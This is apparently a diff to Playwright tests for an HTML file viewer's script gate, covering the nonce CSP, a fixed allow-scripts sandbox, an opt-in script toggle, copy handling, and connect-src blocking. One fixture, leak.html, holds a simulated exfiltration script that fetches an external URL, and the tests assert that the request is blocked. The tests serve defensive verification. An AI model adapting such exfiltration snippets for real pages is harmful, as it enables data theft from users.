@@ -36,6 +36,33 @@ function writeViewerFixtures(): void {
         '<a href="https://example.com/away" id="nav-link">リンク</a>',
         '</body></html>',
     ].join('\n'));
+    // TASK-12: script 実行の可観測プローブ（postMessage は不変条件 7 の capture 遮断で
+    // 届かないため観測子に使えない — 実行痕跡は iframe 内 DOM に書かせて Playwright で読む）
+    fs.writeFileSync(path.join(dir, 'script-probe.html'), [
+        '<!DOCTYPE html><html><head><meta charset="utf-8"><title>probe</title></head><body>',
+        '<div class="body-text">本文が見える</div>',
+        '<div id="out"></div>',
+        '<script>document.getElementById("out").textContent = "RAN";<\/script>',
+        '</body></html>',
+    ].join('\n'));
+    // TASK-12: 選択・コピー用のプレーン html（script なし = copy ヘルパー以外の変数を排除）
+    fs.writeFileSync(path.join(dir, 'plain-text.html'), [
+        '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>',
+        '<p id="para">コピー対象テキスト</p>',
+        '</body></html>',
+    ].join('\n'));
+    // TASK-12: 外部送信の試行（オプトイン ON で script が動いても継承 connect-src で落ちる）
+    fs.writeFileSync(path.join(dir, 'leak.html'), [
+        '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>',
+        '<div id="out"></div>',
+        '<script>',
+        'document.getElementById("out").textContent = "RAN";',
+        'fetch("https://example.com/leak")',
+        '  .then(function () { document.getElementById("out").textContent = "LEAKED"; })',
+        '  .catch(function () { document.getElementById("out").textContent = "BLOCKED"; });',
+        '<\/script>',
+        '</body></html>',
+    ].join('\n'));
     // 壊れた PDF
     fs.writeFileSync(path.join(dir, 'broken.pdf'), Buffer.from('not a pdf at all'));
     // 実 PDF fixture をコピー
@@ -46,21 +73,11 @@ test.beforeAll(() => { writeViewerFixtures(); });
 
 test.describe('file-viewer: HTML 面（FR-FV-04 / NFR-FV-03）', () => {
 
-    test('TC-FV-01: script 非実行番人 — 本文表示 + postMessage 非受信（counterfactual: allow-scripts で RED）', async ({ page }) => {
-        await page.goto('/standalone-viewer.html');
-        const received = await page.evaluate(async () => {
-            const msgs: string[] = [];
-            window.addEventListener('message', (e) => { if (typeof e.data === 'string') { msgs.push(e.data); } });
-            (window as any).__fileViewer.open('html', './viewer-fixtures/sample.html', document.getElementById('viewer-root'));
-            await new Promise((r) => setTimeout(r, 1500));
-            return msgs;
-        });
-        expect(received).not.toContain('pwned-from-iframe');   // script は実行されない
-        // iframe 自体はロードされている（方式 B = blob URL — url でなく frame 内容で特定）
-        const frame = page.frames().find((f) => f.url().startsWith('blob:'));
-        expect(frame).toBeTruthy();
-        expect(await frame!.locator('.meeting-notes').textContent()).toBe('議事録本文');
-    });
+    // H-5（TASK-12・許可: test_update）: 旧 TC-FV-01（script 非実行番人）は削除。
+    // counterfactual「sandbox に allow-scripts を足すと RED」が ADRL-0067 で不成立になったため
+    // （sandbox は既定 allow-scripts になり、防御の実体は blob 継承 CSP の script-src nonce に移った）。
+    // 後継 = TC-FV-41（下の「script ゲート」describe。本文表示 + ユーザー script 不実行の番人は維持し、
+    // counterfactual を「同一 nonce を与えると実行される」に組替）。
 
     test('TC-FV-02: 相対参照 img がロードされる（方式 B: blob + base 注入の恒久番人）', async ({ page }) => {
         const imgRequests: string[] = [];
@@ -74,7 +91,8 @@ test.describe('file-viewer: HTML 面（FR-FV-04 / NFR-FV-03）', () => {
     });
 
     test('TC-FV-03: 外部リンククリックで外部コンテンツがロードされない（親 CSP frame-src の抑止 = 受容事項 2 の pin）', async ({ page }) => {
-        // 実測（2026-08-15）: sandbox="" はリンクによる iframe 内遷移自体は止めない。
+        // 実測（2026-08-15）: sandbox 属性はリンクによる iframe 内遷移自体を止めない
+        // （ADRL-0067 で既定 allow-scripts になった後も同じ — sandbox は遷移の抑止手段ではない）。
         // 抑止の実体は親 CSP frame-src — 外部 URL はブロックされ iframe は chrome-error に落ちる
         // （外部コンテンツは一切ロードされない）。counterfactual: frame-src を外すと example.com へ遷移。
         const externalRequests: string[] = [];
@@ -93,6 +111,206 @@ test.describe('file-viewer: HTML 面（FR-FV-04 / NFR-FV-03）', () => {
         expect(externalFrame, '外部コンテンツの frame が存在しない').toBeUndefined();
         // 方式 B 補足: blob origin からの外部遷移も frame-src が止める（サンドボックスと CSP の二重防御は不変）
         expect(page.url()).toContain('standalone-viewer');     // 親は遷移しない
+    });
+});
+
+/** #viewer-root 配下の iframe が指す現在の blob frame を取得（toggle で src が差し替わるため毎回引き直す） */
+async function currentBlobFrame(page: import('@playwright/test').Page, timeoutMs = 10000) {
+    const deadline = Date.now() + timeoutMs;
+    while (Date.now() < deadline) {
+        const src = await page.evaluate(() =>
+            (document.querySelector('#viewer-root iframe') as HTMLIFrameElement | null)?.src || '');
+        if (src.startsWith('blob:')) {
+            const frame = page.frames().find((f) => f.url() === src);
+            if (frame) { return frame; }
+        }
+        await page.waitForTimeout(150);
+    }
+    throw new Error('blob frame が現れない');
+}
+
+/** frame 内 #out の textContent（script 実行痕跡の観測子。不変条件 7 で postMessage は使えない） */
+async function probeOut(frame: import('@playwright/test').Frame): Promise<string> {
+    return await frame.evaluate(() => document.getElementById('out')?.textContent || '');
+}
+
+test.describe('file-viewer: script ゲート（FR-FV-10 / FR-FV-11 / ADRL-0067）', () => {
+
+    test('TC-FV-41: 既定はユーザー script 不実行 + 本文表示（counterfactual: 同一 nonce を与えると実行される）', async ({ page }) => {
+        await page.goto('/standalone-viewer.html');
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/script-probe.html', document.getElementById('viewer-root'));
+        });
+        const frame = await currentBlobFrame(page);
+        await page.waitForTimeout(800);
+
+        // 本文は見える（sandbox 既定が allow-scripts になっても表示は不変）
+        expect(await frame.locator('.body-text').textContent()).toBe('本文が見える');
+        // ユーザー script は実行されない（防御の実体 = blob が継承した CSP script-src 'nonce-...'）
+        expect(await probeOut(frame), 'nonce なしのユーザー script が実行された').toBe('');
+
+        // counterfactual 実測: 同一 html の script に注入ヘルパーと同じ nonce を与えると実行される
+        // （= 不実行の原因が「script が動かない環境」ではなく nonce ゲートであることの対証明）
+        const nonced = await page.evaluate(async () => {
+            const nonce = (window as any).__viewerConfig.nonce;
+            const html = `<!DOCTYPE html><html><body><div id="out"></div>`
+                + `<script nonce="${nonce}">document.getElementById("out").textContent = "RAN";</` + `script></body></html>`;
+            const url = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
+            const iframe = document.createElement('iframe');
+            iframe.setAttribute('sandbox', 'allow-scripts');
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            await new Promise((r) => setTimeout(r, 800));
+            return { url };
+        });
+        const cfFrame = page.frames().find((f) => f.url() === nonced.url);
+        expect(cfFrame, 'counterfactual iframe が現れない').toBeTruthy();
+        expect(await probeOut(cfFrame!), 'nonce 付き script が実行されない — CSP 前提が崩れている').toBe('RAN');
+    });
+
+    test('TC-FV-42: sandbox は allow-scripts 厳密一致（allow-same-origin 混在は sandbox 脱出 = 不変条件 6）', async ({ page }) => {
+        await page.goto('/standalone-viewer.html');
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/sample.html', document.getElementById('viewer-root'));
+        });
+        await currentBlobFrame(page);
+        const sandbox = await page.evaluate(() =>
+            (document.querySelector('#viewer-root iframe') as HTMLIFrameElement).getAttribute('sandbox'));
+        expect(sandbox, 'sandbox はリテラル allow-scripts 固定').toBe('allow-scripts');
+        expect(sandbox || '', 'allow-same-origin が混在（allow-scripts と併記で sandbox 脱出）').not.toContain('allow-same-origin');
+        // 実装側も literal 固定であること（変数結合で allow-same-origin が混入する経路を残さない）
+        const src = fs.readFileSync(path.join(ROOT, 'src', 'webview', 'file-viewer.js'), 'utf-8');
+        expect(src, 'sandbox 値がリテラルで書かれていない').toContain(`setAttribute('sandbox', 'allow-scripts')`);
+        // コメント（「allow-same-origin は絶対に併記しない」の警告文）は許容し、
+        // コード = 文字列リテラル / setAttribute 実引数に現れることだけを禁じる
+        const codeLines = src.split('\n').filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l));
+        const sameOriginInCode = codeLines.filter((l) => l.includes('allow-same-origin'));
+        expect(sameOriginInCode, 'allow-same-origin がコード行に現れる（sandbox 脱出経路）').toEqual([]);
+    });
+
+    test('TC-FV-43: cmd+c が既定で効く（注入 copy ヘルパー — VS Code webview の native copy 殺しの回避）', async ({ page, context }) => {
+        await context.grantPermissions(['clipboard-read', 'clipboard-write']);
+        await page.goto('/standalone-viewer.html');
+        // 事前汚染: 「取れた」と「元から入っていた」を区別する sentinel
+        await page.evaluate(async () => {
+            try { await navigator.clipboard.writeText('__SENTINEL__'); } catch { /* 権限外は無視 */ }
+        });
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/plain-text.html', document.getElementById('viewer-root'));
+        });
+        const frame = await currentBlobFrame(page);
+        await page.waitForTimeout(500);
+
+        // 注入ヘルパーより後に発火する window 段 probe（bubble 順: document → window）で
+        // 「ヘルパーが preventDefault したか」を観測する。
+        // counterfactual: ヘルパー注入を外すと defaultPrevented === false
+        // （ハーネス Chromium では native copy が代替してしまい clipboard 内容だけでは判別できない。
+        //   本番 VS Code webview は nested iframe の native copy を殺すため実機では空になる — vscode#129178）
+        await frame.evaluate(() => {
+            (window as any).__copyKeyPrevented = null;
+            window.addEventListener('keydown', (e) => {
+                if (e.key === 'c' && (e.metaKey || e.ctrlKey)) { (window as any).__copyKeyPrevented = e.defaultPrevented; }
+            });
+        });
+        await frame.locator('#para').click();
+        await frame.evaluate(() => {
+            const p = document.getElementById('para')!;
+            const range = document.createRange();
+            range.selectNodeContents(p);
+            const sel = window.getSelection()!;
+            sel.removeAllRanges();
+            sel.addRange(range);
+        });
+        await page.keyboard.press(process.platform === 'darwin' ? 'Meta+c' : 'Control+c');
+        await page.waitForTimeout(600);
+
+        const prevented = await frame.evaluate(() => (window as any).__copyKeyPrevented);
+        expect(prevented, '注入 copy ヘルパーが cmd+c を処理していない（preventDefault 痕跡なし）').toBe(true);
+        const text = await page.evaluate(() => navigator.clipboard.readText());
+        expect(text, 'クリップボードに選択テキストが入らない').toContain('コピー対象テキスト');
+    });
+
+    test('TC-FV-44: 「スクリプトを許可」ON で再読込 → ユーザー script が実行される（sandbox は不変）', async ({ page }) => {
+        await page.goto('/standalone-viewer.html');
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/script-probe.html', document.getElementById('viewer-root'));
+        });
+        let frame = await currentBlobFrame(page);
+        await page.waitForTimeout(600);
+        expect(await probeOut(frame), '既定で実行されている（前提崩れ）').toBe('');
+
+        await page.click('.viewer-script-toggle');   // 実クリック
+        await page.waitForTimeout(1200);
+        frame = await currentBlobFrame(page);
+        // counterfactual: nonce rewrite を外すと '' のまま = RED
+        expect(await probeOut(frame), 'オプトイン ON でも script が実行されない').toBe('RAN');
+        // 本文も維持される（再生成で壊れない）
+        expect(await frame.locator('.body-text').textContent()).toBe('本文が見える');
+        // sandbox は ON/OFF に関係なく allow-scripts 固定（不変条件 6）
+        const sandbox = await page.evaluate(() =>
+            (document.querySelector('#viewer-root iframe') as HTMLIFrameElement).getAttribute('sandbox'));
+        expect(sandbox).toBe('allow-scripts');
+        // toggle は ON 状態を表示する
+        expect(await page.getAttribute('.viewer-script-toggle', 'aria-pressed')).toBe('true');
+    });
+
+    test('TC-FV-45: OFF 復帰で静的に戻る + 旧 objectURL revoke + 別ファイルは静的から開始', async ({ page }) => {
+        await page.goto('/standalone-viewer.html');
+        await page.evaluate(() => {
+            (window as any).__revoked = [];
+            const orig = URL.revokeObjectURL.bind(URL);
+            URL.revokeObjectURL = (u: string) => { (window as any).__revoked.push(u); orig(u); };
+            (window as any).__fileViewer.open('html', './viewer-fixtures/script-probe.html', document.getElementById('viewer-root'));
+        });
+        await currentBlobFrame(page);
+        await page.waitForTimeout(600);
+
+        // ON
+        await page.click('.viewer-script-toggle');
+        await page.waitForTimeout(1200);
+        let frame = await currentBlobFrame(page);
+        expect(await probeOut(frame)).toBe('RAN');
+        const onUrl = await page.evaluate(() =>
+            (document.querySelector('#viewer-root iframe') as HTMLIFrameElement).src);
+
+        // OFF 復帰
+        await page.click('.viewer-script-toggle');
+        await page.waitForTimeout(1200);
+        frame = await currentBlobFrame(page);
+        expect(await probeOut(frame), 'OFF に戻しても script が実行される').toBe('');
+        expect(await page.getAttribute('.viewer-script-toggle', 'aria-pressed')).toBe('false');
+        // one-shot リソースの clear 契機: 差し替えた旧 blob URL は revoke される（リーク防止）
+        const revoked = await page.evaluate(() => (window as any).__revoked as string[]);
+        expect(revoked, '差し替え前の objectURL が revoke されていない').toContain(onUrl);
+
+        // 別ファイルを開いたら state はリセットされ静的から始まる（非永続）
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/leak.html', document.getElementById('viewer-root'));
+        });
+        await page.waitForTimeout(1200);
+        frame = await currentBlobFrame(page);
+        expect(await probeOut(frame), '別ファイルでオプトインが引き継がれている').toBe('');
+        expect(await page.getAttribute('.viewer-script-toggle', 'aria-pressed')).toBe('false');
+    });
+
+    test('TC-FV-46: ON でも外部送信は継承 connect-src でブロックされる（オプトインの被害上限）', async ({ page }) => {
+        const externalRequests: string[] = [];
+        page.on('request', (r) => { if (r.url().includes('example.com')) { externalRequests.push(r.url()); } });
+        await page.goto('/standalone-viewer.html');
+        await page.evaluate(() => {
+            (window as any).__fileViewer.open('html', './viewer-fixtures/leak.html', document.getElementById('viewer-root'));
+        });
+        await currentBlobFrame(page);
+        await page.waitForTimeout(600);
+
+        await page.click('.viewer-script-toggle');
+        await page.waitForTimeout(1500);
+        const frame = await currentBlobFrame(page);
+        // script は実行されている（= ゲートは開いた。この前提が崩れると以下が vacuous pass になる）
+        expect(['BLOCKED', 'LEAKED'], 'ON でも script が動いていない — 検証が空回りする').toContain(await probeOut(frame));
+        // 本命: 外部 fetch は継承 CSP connect-src 'self' で落ちる
+        expect(await probeOut(frame), '外部送信が成功した（connect-src が効いていない）').toBe('BLOCKED');
+        expect(externalRequests, 'example.com へのリクエストが発生した').toEqual([]);
     });
 });
 
